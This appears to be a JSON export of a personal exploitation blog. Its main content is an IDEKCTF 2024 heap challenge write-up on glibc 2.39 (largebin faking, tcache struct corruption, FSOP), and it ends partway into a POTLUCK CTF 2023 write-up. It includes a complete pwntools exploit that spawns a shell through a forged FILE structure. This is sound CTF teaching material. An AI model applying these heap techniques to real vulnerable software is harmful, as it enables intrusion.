{"BINARY-EXPLOITATION":{"title":"BINARY-EXPLOITATION","links":["STACK-BASED-EXPLOITATION","LEARNING-NOTES/MALLOC-SRC-CODE-AUDIT","KERNEL-EXPLOITATION"],"tags":["blog"],"content":"This is the documentation of my journey into binary exploitation and computer science as a whole, not having done anything related to computer science until my college first year, I am starting blind, wish me luck.\nCurrently playing CTF’s with the team bi0s.\n1 year later : Still a newbie but I think Im starting to get somewhere.\nEntrypoint 1 : STACK-BASED-EXPLOITATION\nEntrypoint 2 : MALLOC SRC CODE AUDIT\nEntrypoint 3 : KERNEL EXPLOITATION"},"CTF-WRITEUPS/IDEKCTF-2024":{"title":"IDEKCTF 2024 - A SILENCE OF 3 PARTS","links":["discordapp.com/users/_r0r1_"],"tags":["blog","heap-exploitation","ctf-writeups"],"content":"\nA SILENCE OF 3 PARTS &lt;&lt;  IDEKCTF 2024\nTOTAL SOLVES : 3\nIDEKCTF 2024 was a fun ctf with many cool pwn challenges but I kind of got hung up on this one challenge throughout the ctf. I used the trick from the previous post to improve the odds with this challenge - I will re-explain it as I didnt go as much in depth with the other one.\n\nPREMISE -\nThere are classic heap challenge functions such as :\ngibberish()? … nvm\n\nmalloc()\n\n\nMallocs nbytes of size almost arbitrary but not something illogical through use of scanf\n\n\nfree()\n\n\nFrees the index and sets a flag to 0 indicating chunk has been freed\n\n\nzap()\n\n\nA non traditional heap function called zap which sets the lowest byte of fd to NULL of a chunk at whatever index, this can be called only once\n\nPRIMITIVE -\nA single NULL byte write onto the forward pointer of any freelist in malloc as you can zap a freed chunk\nThis is a leakless challenge where the only leak you get is by overwriting file structure.\n\nINTENDED :\nYou can check the challenge authors blog for that :D. I probably wouldnt have been able to come up with such an idea as explained here whenever it’ll be up here → unvariant. Thus I had to come up with something unusual. I think you should go read the actual solution first before the current cause I feel one should always appreciate what the challenge was supposed to be before what it became.\n\nUNINTENDED / MY APPROACH -\nIn the description of the challenge the author mentioned that the aslr brute was not above 8 bits to which initially my idea was to overwrite the lowest byte of a tcache chunk to get an 8 bit brute on an overlap which I could maybe use as a spray of size to reduce it to a 4 bit brute. But it seemed way too unreliable as for fsop also in the method that I knew of we needed another 4 bit brute for our chunk to land on the file structure and for us to get the leaks.\nHonestly i just wanted to improve my odds because my internet is terrible\nSince I have to improve my primitives I looked at the malloc source to see if I can find something useful.\nI noticed how within largebins if you allocate to a largebin of the following format, The chunk with the skiplist is not removed as it is expensive. Thus it proceeds to the next chunk of same size which is removed.\n\n\n                  \n                  Linux users can probably skip this note \n                  \n                \n\numm… if the diagrams look slightly off to you it is because SKILL ISSUE, why you using windows or mac ?? jk its prolly because of the font your browser uses (0_0);\n\n\n┍━━━━━━━━━┑       ┍━━━━━━━━━┑       ┍━━━━━━━━━┑       \n│ [0x420] │ ─── &gt; │ [0x420] │ ─── &gt; │ [0x430] │       \n│         │ &lt; ─── │         │ &lt; ─── │         │       \n┕━━━━━━━━━┙       ┕━━━━━━━━━┙       ┕━━━━━━━━━┙      \n    │                                    ˰\n    └────────────────────────────────────┘\n                SKIP-LIST\n\nREQUESTS FOR 0x420\n\n┍━━━━━━━━━┑       ┍━━━━━━━━━┑       \n│ [0x420] │ ─── &gt; │ [0x430] │       \n│         │ &lt; ─── │         │       \n┕━━━━━━━━━┙       ┕━━━━━━━━━┙      \n    │                  ˰\n    └──────────────────┘\n         SKIP-LIST\n\nThis is the piece of code that corresponds to the following action :\n if ((unsigned long) size\n\t\t\t  == (unsigned long) chunksize_nomask (fwd))\n                        /* Always insert in the second position.  */\n                        fwd = fwd-&gt;fd;\n                      else\n                        {\n                          victim-&gt;fd_nextsize = fwd;\n                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;\n                          if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n                            malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);\n                          fwd-&gt;bk_nextsize = victim;\n                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;\n                        }\n                      bck = fwd-&gt;bk;\n                      if (bck-&gt;fd != fwd)\n                        malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);\nGAINING OVERLAPPING CHUNKS\nHere the only check that happens is that of the fd thus we can use this to fake a largebin chunk by setting pointers and crafting a fake chunk. We do obviously have to make a chunk that passes the unlink_chunk function within the src but this just provides us a way to get overlaps.\nIf we dont use the largebin of this size afterwards we wont also run into much issues regarding the corruption of this linked list. Thus a cool way to get overlapping chunks when you can edit the fd by one byte.\nHOW DO YOU SET THE POINTERS ?\nTo set the pointers I used a malloc consolidate of size 0x30 chunks to consolidate the fastbins and coalesce to retain pointers within the smallbin. This gave me a proper link between chunks which is extremely useful for blind challenges like this. I chose size 0x30 because that was the perfect size where I could coalesce the chunks but also overwrite the pointers to point to each of the chunks, This is a really cool technique to just setup pointers.\nThe current setup resulted in me getting an overlapped largebin chunk. :D\n\n\n                  \n                  PART 1 COMPLETE : GET OVERLAPPING CHUNKS \n                  \n                \n\nBUT WHAT NOW ?\nI was looking at the options on what all could be used as to reduce the brute and remembered the trick from the previous writeup i put out. Since we now have overlapping chunks, we can just directly attack the tcache perthread struct but doing the following.\nI call this a smallbin stash diversion ive not seen an attack like this in how2heap or in the internet so :D new technique? idk\nThough one technique that uses this concept of stashing is the smallbin stashing unlink attack which works in the latest glibc versions but it uses calloc for getting an unlink to bypass the tcache layer in libc. while this is a primitive that works for when you just malloc this is kind of inspired from that.\nSUPPOSE THE SMALLBIN LOOKS LIKE THIS BELOW\nAFTER TCACHE OF SAME SIZE IS EXHAUSTED AND WE REQUEST A CHUNK\n\n┍━━━━━━━━━┑       ┍━━━━━━━━━┑       ┍━━━━━━━━━┑       ┍━━━━━━━━━┑     ╤╤╤\n│  [0x98] │ ─── &gt; │  [0x98] │ ─── &gt; │  [0x98] │ ─── &gt; │  [0x98] │ ──&gt; │ │\n│         │ &lt; ─── │         │ &lt; ─── │         │ &lt; ─── │         │ &lt;── │ │\n┕━━━━━━━━━┙       ┕━━━━━━━━━┙       ┕━━━━━━━━━┙       ┕━━━━━━━━━┙     ╤╤╤\n\nONE IS RETURNED \n┍━━━━━━━━━┑       ┍━━━━━━━━━┑       ┍━━━━━━━━━┑     ╤╤╤\n│  [0x98] │ ─── &gt; │  [0x98] │ ─── &gt; │  [0x98] │ ──&gt; │ │ \n│         │ &lt; ─── │         │ &lt; ─── │         │ &lt;── │ │\n┕━━━━━━━━━┙       ┕━━━━━━━━━┙       ┕━━━━━━━━━┙     ╤╤╤\n\nREST ARE MOVED INTO TCACHE\n╤╤╤      ┍━━━━━━━━━┑       ┍━━━━━━━━━┑       ┍━━━━━━━━━┑\n│ │ -──&gt; │  [0x98] │ ─── &gt; │  [0x98] │ ─── &gt; │  [0x98] │ ──&gt; 0 \n│ │      │         │       │         │       │         │\n╤╤╤      ┕━━━━━━━━━┙       ┕━━━━━━━━━┙       ┕━━━━━━━━━┙\n\nThis is thanks to this piece of code -\n#if USE_TCACHE\n\t  /* While we&#039;re here, if we see other chunks of the same size,\n\t     stash them in the tcache.  */\n\t  size_t tc_idx = csize2tidx (nb);\n\t  if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)\n\t    {\n\t      mchunkptr tc_victim;\n \n\t      /* While bin not empty and tcache not full, copy chunks over.  */\n\t      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count\n\t\t     &amp;&amp; (tc_victim = last (bin)) != bin)\n\t\t{\n\t\t  if (tc_victim != 0)\n\t\t    {\n\t\t      bck = tc_victim-&gt;bk;\n\t\t      set_inuse_bit_at_offset (tc_victim, nb);\n\t\t      if (av != &amp;main_arena)\n\t\t\tset_non_main_arena (tc_victim);\n\t\t      bin-&gt;bk = bck;\n\t\t      bck-&gt;fd = bin;\n \n\t\t      tcache_put (tc_victim, tc_idx);\n\t            }\n\t\t}\n\t    }\nSo the following code doesn’t check the links of the linked list thus what we can do is\nSetup the bk pointers to go through whatever region we want to allocate on.\nAs long as it forms a closed loop back to the smallbin of the same size we can get an allocation anywhere we want.\nDepending on the setup we can pull this off completely leakless also if we rely on placing pointers and partially overwriting it.\nEg:\nLet us take the same scenario as before -\nSUPPOSE THE SMALLBIN LOOKS LIKE THIS BELOW\nAFTER TCACHE OF SAME SIZE IS EXHAUSTED AND WE REQUEST A CHUNK\n\n╤╤╤     ┍━━━━━━━━━┑       ┍━━━━━━━━━┑       ┍━━━━━━━━━┑       ┍━━━━━━━━━┑     ╤╤╤\n│ │ ──&gt; │  [0x98] │ ─── &gt; │  [0x98] │ ─── &gt; │  [0x98] │ ─── &gt; │  [0x98] │ ──&gt; │ │   CHUNKS GETS REMOVED THIS END\n│ │ &lt;── │    1    │ &lt; ─── │    2    │ &lt; ─── │    3    │ &lt; ─── │    4    │ &lt;── │ │   4 GETS REMOVED FIRST SINCE FIFO\n╤╤╤     ┕━━━━━━━━━┙       ┕━━━━━━━━━┙       ┕━━━━━━━━━┙       ┕━━━━━━━━━┙     ╤╤╤\n                                      ⇑⇑⇑⇑⇑⇑           ⇑⇑⇑⇑⇑⇑⇑\n                                BUT NOT FROM HERE   LINKS CHECKED HERE    \n\n[+] INITIAL ALLOCATION HAS HAPPENED \n\n\nTHUS WE CAN MAKE BK AN ARBITRARY ADDRESS THAT STILL CLOSES THE LOOP BACK\n\n                                          │ SMALLBIN WITH                                      \n                                          │ control over bk                        \n                                          │ fd can be gibberish()\n                                             ↓↓↓↓↓↓↓↓↓\n╤╤╤     ┍━━━━━━━━━┑       ┍━━━━━━━━━┑       ┍━━━━━━━━━┑     ╤╤╤\n│ │ ──&gt; │  [0x98] │ ─── &gt; │  [0x98] │ ─── &gt; │  [0x98] │ ──&gt; │ │ \n│ │ &lt;┐  │    1    │ &lt; ─── │    2    │     ┌─│    3    │ &lt;── │ │\n╤╤╤  │  ┕━━━━━━━━━┙       ┕━━━━━━━━━┙     │ ┕━━━━━━━━━┙     ╤╤╤\n     │                                    │            ⇑⇑⇑⇑⇑\n     │                                    │     STASHING STARTS HERE \n     │                                    │     \n     │  ┍━━━━━━━━━┑       ┍━━━━━━━━━┑     │ \n     │  │  [0x98] │ ─── &gt; │  [0x98] │ &lt;───┘\n     └─ │    5    │ &lt; ─── │    V    │\n        ┕━━━━━━━━━┙       ┕━━━━━━━━━┙     \n          ⇑⇑⇑⇑⇑⇑⇑              ┊\n    │&gt; CHUNK IN CONTROL        │  \n    │&gt; we point it back        └ AREA THAT WE WANT TO CONTROL\n    │&gt; to smallbin[0x98]       \n\n[+] STASHING HAS HAPPENED \n\nTHE FAKE SMALLBIN THUS GETS MOVED INTO TCACHE\n\n╤╤╤      ┍━━━━━━━━━┑       ┍━━━━━━━━━┑       ┍━━━━━━━━━┑\n│ │ -──&gt; │  [0x98] │ ─── &gt; │  [0x98] │ ─── &gt; │  [0x98] │ ──&gt; 0 \n│ │      │    5    │       │    V    │       │    3    │\n╤╤╤      ┕━━━━━━━━━┙       ┕━━━━━━━━━┙       ┕━━━━━━━━━┙\n                                ┊\nNOW ALLOCATING THROUGH TCACHE   │\nWE GET ALLOCATION HERE  ────────┘\n\n[+] YOU SUCCEEDED IN GETTING THE ALLOCATION\n\n\nWhere is this useful ?\n\nif\n\n\nYou have a heap pointer at a known address\nThe address in which the pointer lies has the last nibble be 0x8 because we are using it as the bk\nThe data at the heap pointer is controlled by user\n\n\nThen\n\n\nYou can get an allocation on the heap pointer\n\n\nNOTE :\n\n\nBut for leakless challenges due to partial overwrite you are sort of restricted to the heap if there are no other pointers in the heap.\nUnless in cases where there could be residual pointers from previous allocations which you can overwrite to get an allocation through.\n\nThis is most useful for circumstances where you want to convert a UAF to an arbitrary write\nBUT DO WE HAVE A HEAP ARRAY AT A KNOWN ADDRESS ?\nThe tcache perthread struct is used to manage the tcache allocations and frees and it is directly within heap unencrypted\nwe can target the following to get arbitrary writes especially in blind challenges.\nSo what did I do? since tcache points directly at user-data we can use it to fake a smallbin chunk.\nbut we need a libc pointer in tcache struct thus I did the same twice,\n\nto write the size on the struct\nto get allocation so that we can free the chunk and put into unsorted bin to place the libc pointer in the struct.\n\nThis can be done completely leakless and with 100% accuracy if you can have 2 chunks within 0x80 bytes from the tcache as tcache itself is of size 0x290 at the start of the libc.\nThus i chose size 0x28 as it gives me 2 chunks such that I can edit the last byte to reach the tcache struct.\nWe need this because editing more than 1 byte would lead to having to deal with aslr and bruting.\n\n\n                  \n                  PART 2 COMPLETE : TCACHE PERTHREAD STRUCT CORRUPTION \n                  \n                \n\nDO WE GET A LEAK, ANYTIME SOON ?\nYou can use fsop to leak the libc addresses within the file structure itself by editing the flags and setting a few pointers to null it has been beautifuly explained by sherl0ck here, Thus I wont be going much into it. This is the part where it required a 4 bit brute as the aslr address had the 4th nibble be random due to page alignment being 0x1000 bytes.\nCODE EXECUTION ?\nIn glibc 2.39 many code execution paths have been patched so we can mostly only rely on fsop, which is exactly what was done, I used _IO_wdoallocbuf+43 code path for code execution. It is mentioned here in niftic’s blog and referred blog for the structure.\n\n\n                  \n                  PART 3 COMPLETE : CODE EXECUTION \n                  \n                \n\nThats it for a silence of 3 parts\nI dont know if this warrants to being a house but if it was I would call it House of pain :) enough with the unfunny jokes then :D.\nI wanted to blood the challenge but couldn’t due to how complicated this exploit got but the challenge was worth solving, felt like I re-explored malloc though, I reccomend this as a challenge I’ve had fun with despite the painfulness of some of the parts of this exploit. I would not have solved this challenge the intended way even If i could have gotten the script done cause of my connection speed which is as slow as a sloth, well at least got a third blood (`o`)/.\nIf you have any queries regarding this or if I missed something or If you just want to talk about pwning I’m  _r0r1_ in discord\nAnd that’s about it Here is my exploit for the same &gt;\nEXPLOIT\nfrom pwn import *\n \nexe = &#039;./chal&#039;\n \n(host,port) = (&quot;a-silence-of-three-parts.chal.idek.team&quot;,1337)\n \ndef start(argv=[], *a, **kw):\n    if args.GDB:\n        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)\n    \n    elif args.RE:\n        return remote(host,port)\n    else:\n        return process([exe] + argv, *a, **kw)\n \ngdbscript = &#039;&#039;&#039;\nb * main\n&#039;&#039;&#039;.format(**locals())\n \ncontext.terminal = [&quot;gnome-terminal&quot;, &quot;--&quot;]\n \n# ====================[EXPANSIONS]=========================\n \nse  = lambda data  : p.send(data)\nsl  = lambda data  : p.sendline(data)\nsa  = lambda ip,op : p.sendafter(ip,op)\nsla = lambda ip,op : p.sendlineafter(ip,op) \nrvu = lambda data  : p.recvuntil(data)\nrvl = lambda       : p.recvline()\nrv  = lambda nbyt  : p.recv(nbyt)\n \n# &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[EXPLOIT STARTS HERE]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\n \n# context.aslr = False\n \ncount = 0\nfreed = [&quot;&quot; for i in range (0x7f)]\n \ndef malloc(cname,size,stuff,norecv=0):\n    global count\n    sla(b&quot;:&quot;,b&quot;0&quot;)\n    sla(b&quot;:&quot;,str(size).encode())\n    sa(b&quot;: &quot;,stuff)\n    if(norecv != 1):\n        rvu(b&quot;:&quot;)\n \n    i = 0 \n    while(freed[i] != &quot;&quot;):\n        i += 1\n    freed[i] = cname\n \n    count += 1\n    print(count)\n \ndef free(cname):\n    idx = 0 \n    while(freed[idx] != cname):\n        idx += 1\n    \n    sla(b&quot;:&quot;,b&quot;1&quot;)\n    sla(b&quot;:&quot;,str(idx).encode())\n    \ndef zap(cname):\n    idx = 0 \n    while(freed[idx] != cname):\n        idx += 1\n    \n    sla(b&quot;:&quot;,b&quot;2&quot;)\n    sla(b&quot;:&quot;,str(idx).encode())\n    \np = start()\n \n# POW\nif args.RE:\n    rvl()\n    rvl()\n    rvl()\n    rvu(&quot;solve &quot;)\n    p1 = &quot;python3&quot;\n    p2 = rvl().decode()[:-1:]\n \n    proc = [p1,&quot;pow.py&quot;,&quot;solve&quot;,p2]\n    print(proc)\n    x = subprocess.run(proc, capture_output=True)\n    print(x.stdout)\n \n    sl(x.stdout)\n \n# NEW PLAN \n# largebin chunk faking to get waf + tcache stashing unlink or house of water to get libc pointer in tcache_struct + fsop \n# STEP 1 : PULL OF A LARGEBIN SKIP ATTACK ON A FAKE CHUNK AND GET WRITE AFTER FREE\n# STEP 2 : DO A TCACHE STASH DIVERSION ATTACK TO GET ALLOCATION OVER TCACHE_STRUCT\n# STEP 3 : FREE THE FAKE LARGEBIN CHUNK IN PERTHREAD STRUCT TO GET LEAKS \n# STEP 4 ? : FSOP T-T PAIN\n \n# LARGEBINS [0x420]-&gt;[0x430]\n# WE CHANGE LINKS FROM THIS TO [0x420]-&gt;[0x420 - FAKE]\n# FAKE CHUNK RESTRICTIONS = bk-&gt;fd = fd and fd-&gt;bk = bk\n# WHAT A PAIN THO :D WE HAVE TO ALIGN IT TO 0x100 BYTES\n \nfor i in range (11):\n    if(i &gt; 7):\n        malloc(f&quot;B20-{i}&quot;,0x18,&quot;BARRIER&quot;)\n        malloc(f&quot;B20.1-{i}&quot;,0x28,&quot;BARRIER&quot;)\n    malloc(f&quot;T20-{i}&quot;,0x28,&quot;BARRIER&quot;)\n    if(i == 6):\n        malloc(f&quot;VICTIM-0&quot;,0x18,&quot;BARRIER&quot;)\n \n# PLACING POINTER TO LINK THE LARGEBIN\nmalloc(&quot;MC-1&quot;,0x420,&quot;CONSOLIDATE&quot;)\nmalloc(&quot;T20-11&quot;,0x28,&quot;BARRIER&quot;)\nmalloc(&quot;T20-12&quot;,0x28,&quot;BARRIER&quot;)\nmalloc(&quot;T20-13&quot;,0x28,&quot;BARRIER&quot;)\n \nfor i in range (7):\n    free(f&quot;T20-{i}&quot;)\n \nfree(&quot;T20-12&quot;)\nfree(&quot;T20-9&quot;)\nfree(&quot;T20-8&quot;)\nfree(&quot;T20-7&quot;)\n \nmalloc(&quot;MC-0&quot;,0x420,&quot;CONSOLIDATE&quot;)\n \n# CONSOLIDATING FASTBINS TO GET POINTERS IN PLACE\nfree(&quot;B20.1-9&quot;)\nfree(&quot;B20.1-8&quot;)\n \n# THERE IS SOME FUTURE SETUP HERE WHICH WILL BE REVEALED IN TIME\nfree(&quot;MC-1&quot;)\nmalloc(&quot;MC-2&quot;,0x420,b&quot;CONSOLIDATE:D YE&quot; + 0xa0*b&quot;\\x00&quot; + p64(0x460) + p64(0x3a1) + \n        0x2b0*b&quot;\\x00&quot; + \n        p64(0x430) + p64(0xe0))\n \n# WE HAVE SUCCESFULLY fsD A LARGEBIN CHUNK&#039;S TOP\nmalloc(&quot;VICTIM&quot;,0x58,0x28*b&quot;a&quot; + p64(0x431) + b&quot;\\x80&quot;)\nmalloc(&quot;ACCOMPLICE&quot;,0x58,0x28*b&quot;a&quot; + p64(0x961))\n \nfree(&quot;T20-13&quot;)\nmalloc(&quot;MC-3&quot;,0x420,b&quot;CONSOLIDATE HEHE&quot;)\nfree(&quot;MC-3&quot;)\nfree(&quot;MC-0&quot;)\n \n# BYE LARGEBIN YOU WILL BE MISSED\nmalloc(&quot;MC-4&quot;,0x420,b&quot;LARGEBIN SACRIFICE&quot;)\nmalloc(&quot;B-1&quot;,0x48,b&quot;YOU CANT GO INTO THE WILDERNESS YET&quot;)\n \n# BEFORE WE KILL OFF LARGEBINS WE HAVE SOME STUFF TO DO\n# WE NEED TO ALLOCATE SOME CHUNKS OF PARTICULAR SIZES \n# SETUP BK POINTERS IN A WAY WHERE IT LEADS BACK TO SMALLBIN\n# THIS HAS TO BE SETUP FOR TWO INCOMING STASHING ATTACKS AFTER WHICH WE WILL BECOME AN OVERLORD\n# WE NEED A TCACHE CHUNK JUST ABOVE SMALLBIN TO SET UP A POINTER TO IT\n# AFTER WHICH WE COALESCE AND SETUP STUFF\n# GENERAL LAYOUT [S1]-&gt;[S2]-&gt;[CHNK_NEAR_STRUCT]-&gt;[S3]\n# CORRUPTED LAYOUT [S]-&gt;[S2]-&gt;[PERTHREAD_STRUCT]-&gt;[S3]\n# S3 CAN BE ANYWHERE BUT IT WILL BE TCACHE OF SIZE \n \n# SETTING UP SMALLBIN POINTERS FOR TCACHE-STASH DIVERSION ATTACK\n# I DONT THINK THIS ATTACK HAS ANY OFFICIAL NAME THOUGH SO ILL JUST CALL IT THAT\n \n# ====================== SETTING UP SMALLBIN POINTERS FOR ATTACK ============================\n \n# SETTING UP ATTACK FOR TCACHE ENTRY 0x328\n \nfor i in range (8):\n    malloc(f&quot;CACHE-{i}&quot;,0x28,b&quot;AAAA&quot;)\n \nmalloc(&quot;T-0&quot;,0x450,&quot;HAHA&quot;)\nmalloc(&quot;TT-0&quot;,0x28,&quot;HAHA&quot;)\nmalloc(&quot;TB-0&quot;,0x28,&quot;HIHU&quot;)\n \nfor i in range (7):\n    free(f&quot;CACHE-{i}&quot;)\n \n# PUTTING CHUNK IN SMALLBIN\nfree(&quot;TT-0&quot;)\nmalloc(&quot;T-2&quot;,0x440,&quot;HUHU&quot;)\nfree(&quot;T-0&quot;)\nfree(&quot;TB-0&quot;)\n \n# TRIGGERING MALLOC_CONSOLIDATE AGAIN TO COALESCE BACKWARD\nmalloc(&quot;T-3&quot;,0x440,&quot;HUHU&quot;)\nfree(&quot;T-2&quot;)\nmalloc(&quot;STUFF1&quot;,0x328,b&quot;SOMETHING&quot;)\nfree(&quot;STUFF1&quot;)\n \n# ====================== SETTING UP SMALLBIN POINTERS FOR ATTACK? ============================\n \n# THIS IS JUST THE SAME THING REPEAT WITH SOME NAMES CHANGED \n# BUT THIS TIME WE ARE DOING THE SAME FOR TCACHE STRUCT ENTRY 0x348\n \nfor i in range (7):\n    malloc(f&quot;CACHE2-{i}&quot;,0x28,b&quot;AAAA&quot;)\n \nmalloc(&quot;2T-0&quot;,0x450,&quot;HAHA&quot;)\nmalloc(&quot;2TT-0&quot;,0x28,&quot;HAHA&quot;)\nmalloc(&quot;2TB-0&quot;,0x28,&quot;HIHU&quot;)\n \nfor i in range (7):\n    free(f&quot;CACHE2-{i}&quot;)\n \n# PUTTING CHUNK IN SMALLBIN\nfree(&quot;2TT-0&quot;)\nmalloc(&quot;2T-2&quot;,0x440,&quot;HUHU&quot;)\nfree(&quot;2T-0&quot;)\nfree(&quot;2TB-0&quot;)\n \n# TRIGGERING MALLOC_CONSOLIDATE AGAIN TO COALESCE BACKWARD\nmalloc(&quot;2T-3&quot;,0x440,&quot;HUHU&quot;)\nfree(&quot;2T-2&quot;)\nmalloc(&quot;STUFF2&quot;,0x348,b&quot;SOMETHING&quot;)\nfree(&quot;STUFF2&quot;)\n \n# ======================== SETTING UP THE SMALLBINS TO FREE ================================\n \nfor i in range (13):\n    malloc(f&quot;SMOB-{i}&quot;,0x18,&quot;:D&quot;)\n    malloc(f&quot;SMOL-{i}&quot;,0x28,&quot;:D&quot;)\n \n# SETTING UP 0x28 SMALLBIN\n \nfor i in range (9):\n    if(i == 6 or i==5):\n        continue\n    free(f&quot;SMOL-{i}&quot;)\n    \n# ONE NEAR\nfree(&quot;SMOL-6&quot;)\n# ONE IN CONTROL\nfree(&quot;B20.1-10&quot;)\n# DED CHUNKS\nfree(&quot;SMOL-0&quot;)\nfree(&quot;SMOL-9&quot;)\nfree(&quot;SMOL-10&quot;)\n \nfor i in range (3):\n    malloc(f&quot;MAIN{i}&quot;,0x338,b&quot;AAAAAAAA&quot;)\n \n# [ONE_TO_GET_USED]-&gt;[ONE_IN_CONTROL]-&gt;[ONE_NEAR_STRUCT]\n# THIS IS THE BASIC STRUCTURE OF THE EXPLOIT \n# ONE_NEAR THE STRUCT IS PARTIALLY OVERWRITTEN WITH THE PERTHREAD STRUCT ADDRESS AS WE HAVE WAF\n# FIRST WRITE IS PRETTY SIMPLE AS WE CAN SET IT UP A BIT BEFORE BUT SECOND ONE IS TRICKY\n \n# ==================== MARKING WHERE WE KILL OFF LARGEBINS =====================\n \n# SETTING UP LARGEBINS\nfree(&quot;MC-4&quot;)\nfree(&quot;MC-2&quot;)\n \n# # SHUFFLE AND ZAP OUT LARGEBINS T-T\nmalloc(&quot;SHF-1&quot;,0x600,&quot;HELLO&quot;)\nzap(&quot;MC-4&quot;)\ncontext.log_level = &quot;DEBUG&quot;\n \n# GAINING OVERLAPPING CHUNKS\nmalloc(&quot;OVERLAP-1&quot;,0x428,b&quot;OH MY GAD (&#039;O&#039;) OVERLAPPING CHUNKS YEY!!&quot; + \n        p64(0x21) + 0x18*b&quot;a&quot; + \n        p64(0x31) + 0x8*b&quot;a&quot;  + b&quot;\\x00&quot;\n        )\n \nfor i in range (8):\n    malloc(f&quot;CACHE3-{i}&quot;,0x28,b&quot;AHAHA&quot;)\n \n# =================== GOT FIRST ALLOCATION ON TCACHE STRUCT ======================\n \n# GETTING SIZE ALLOCATED ON THE TCACHE PERTHREAD STRUCT \nmalloc(&quot;CACHE3-8&quot;,0x28,b&quot;AHAHA&quot;)\nmalloc(&quot;VICTIM-2&quot;,0x28,p64(0x0) + p64(0x461) + p64(0x0))\n \nmalloc(&quot;CACHE3-9&quot;,0x28,&quot;HAAHAH&quot;)\n \n# FILLING TCACHE\nfor i in range (6):\n    if(i == 2):\n        continue\n    free(f&quot;CACHE3-{i}&quot;)\n \nfree(&quot;SMOL-11&quot;)\n \n# ONE NEAR\nfree(&quot;CACHE3-2&quot;)\n# ONE IN CONTROL\nfree(&quot;CACHE3-9&quot;)\n# DED CHUNKS\nfree(&quot;CACHE3-7&quot;)\nfree(&quot;CACHE3-9&quot;)\nfree(&quot;SMOL-12&quot;)\n \nmalloc(&quot;SH1&quot;,0x500,&quot;HELLO&quot;)\n \nfree(&quot;VICTIM&quot;)\nmalloc(&quot;VICTIM2&quot;,0X58,0x28*b&quot;a&quot; + p64(0xb1))\n \nfree(&quot;OVERLAP-1&quot;)\nmalloc(&quot;MODIFY&quot;,0xa8,5*p64(0x0) + p64(0x21) + 0x18*b&quot;a&quot; + \n        p64(0x31) + 0x8*b&quot;a&quot;  + b&quot;\\x10&quot;)\n \nfor i in range (9):\n    malloc(f&quot;CACHE4-{i}&quot;,0x28,&quot;AAAA&quot;)\n \nfor i in range (3):\n    free(f&quot;MAIN{i}&quot;)\n \n# =================== GOT SECOND ALLOCATION ON TCACHE STRUCT ======================\n \nmalloc(&quot;ZER0&quot;,0x28,p64(0x0))\nfree(&quot;ZER0&quot;)\n \nmalloc(&quot;TSP&quot;,0x458,b&quot;\\xc0\\x45&quot;)\n \npayload = p64(0xfbad1800) + p64(0x0)*3 + b&quot;\\x00&quot;\nmalloc(&quot;FSOPLEAK&quot;,0x338,payload,norecv=1)\n \n# ========================== GETTING LIBC LEAK ===================================\n \nlibc = u64((rv(6)).ljust(8,b&quot;\\x00&quot;)) - 0x204644\nprint(&quot;[+] LIBC OBTAINED : &quot;,hex(libc))\nrvu(b&quot;:&quot;)\n \nfree(&quot;TSP&quot;)\nmalloc(&quot;FINAL-0&quot;,0x458,p64(libc + 0x2045c0))\n \n# ================================ FSOP =====================================\nfp = libc + 0x2045c0\nsystem = libc + 0x58740\nwfileoverflow   = libc + 0x202390\n \n# STDOUT \n \nfs  = b&quot;\\x01;sh&quot;.ljust(8,b&quot;\\x00&quot;)   # original _flags &amp; ~_IO_USER_BUF\nfs += p64(0x0) * 12                  # _IO_read_ptr to _markers\nfs += p64(0x0)                      # _chain\nfs += p32(1)                        # _fileno\nfs += p32(0)                        # _flags2\nfs += p64(0)                        # _old_offset\nfs += p16(0)                        # _cur_column\nfs += p8(0)                         # _vtable_offset\nfs += b&#039;\\n&#039;                         # _shortbuf\nfs += p32(0)                        # padding \nfs += p64(libc + 0x2049d8)          # _lock\nfs += p64(0)                        # _offset\nfs += p64(0)                        # _codecvt\nfs += p64(fp - 0x10)                # _wide_data\nfs += p64(0)                        # _freeres_list\nfs += p64(0)                        # _freeres_buf\nfs += p64(0)                        #__pad5\nfs += p32(0xffffffff)               # _mode\nfs += (p32(0x0) + p64(system) + p64(fp + 0x60)).ljust(20,b&quot;\\x00&quot;) # _unused2\nfs += p64(wfileoverflow - 0x38)     # vtable\n \nmalloc(&quot;FSOPLEAK&quot;,0x338,fs,norecv=1)\n \np.interactive()\n \n\n\n                  \n                  Quote\n                  \n                \n\nNew phrack zine dropped go read it byee : D\n\n"},"CTF-WRITEUPS/POTLUCKCTF-2023":{"title":"POTLUCKCTF-2023 TAMAGOYAKI","links":[],"tags":["blog","heap-exploitation","ctf-writeups"],"content":"\nTAMAGOYAKI &lt;&lt; POTLUCK CTF 2023\nCODE REVIEW -\nThe code has the following functions\n\ndinner()\n\n\nChecks if a byte sequence exist in an mmapped region which we do not know the location of, If it exists it prints out the flag.\n\n\ndo_malloc()\n\n\nCalls malloc where we control what size is allocated and which offset to that we write to\n\n\ndo_free()\n\n\nCalls free where we control what pointer is freed, and no pointers are nulled out i.e we can free more than once any pointer that we choose.\n\nDuring the setup stage a function prep() is called which mmaps at a random offset and puts the flag there and checks if a write was made to the location. The function after that puts the address in an 0x18 malloc chunk which would be the first chunk in the heap after the tcache per thread struct.\nCHALLENGE SUMMARY\nTo get to the mmapped region and mark the offset with the following 0x37C3C7F byte sequence which will write out the flag when you call the function dinner.\nThe challenge here requires you to do the following without getting any leaks for the mmapped region or without leaking any heap pointers to arrive at that place and write the bytes in the offset.\nThis would have been quite simple without safelinking in place as we could go for the following approach\n\nfill up tcache\nsomehow make a tcache point to the 0x21 chunk using partial overwrites on the heap pointers.\nAllocate tcache twice to get the mmaped location as the chunk.\nNoice\nBut that is not the case, thus we have to find some way to get around safe-linking here. The only way I think it is possible is somehow making the protect_ptr function encrypt and decrypt a custom pointer that we provide but not mess up tcache 